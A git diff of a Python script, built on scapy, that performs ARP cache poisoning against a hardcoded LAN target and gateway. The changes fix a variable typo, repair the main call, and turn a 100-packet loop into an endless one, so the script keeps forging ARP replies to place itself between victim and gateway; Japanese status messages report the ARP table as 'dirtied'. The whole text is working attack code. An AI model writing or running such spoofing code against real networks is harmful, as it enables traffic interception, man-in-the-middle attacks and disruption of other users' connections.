@@ -4,11 +4,7 @@
 from scapy.all import *
 import os
 import sys
-
-
-interface = "" 
-target_ip = ""
-target_gw = ""
+import threading
 
 
 def get_mac(ip_addr):
@@ -32,20 +28,23 @@ def defile(target_gw,tgw_mac,target_ip,tip_mac):
 
 	defile_gateway = ARP()
 	defile_gateway.op   = 2
-	dedile_gateway.psrc = target_ip
+	defile_gateway.psrc = target_ip
 	defile_gateway.pdst = target_gw
 	defile_gateway.hwdst= tgw_mac
 	
-	for n in range(100):
+	while True:
 		send(defile_target)
 		send(defile_gateway)
-
 
 	print("[*] arpテーブルを汚してきたよ完了しタオ")
 	return
 
 
 if __name__ == "__main__":
+	
+
+	target_ip = "192.168.179.6"
+	target_gw = "192.168.179.1"
 
 	tip_mac = get_mac(target_ip)
 
@@ -59,6 +58,6 @@ if __name__ == "__main__":
         	print("Target_gwがまちがってるっぽい")
         	sys.exit(0)
 
-
+	
  
-	defile()
+	defile(target_gw,tgw_mac,target_ip,tip_mac)
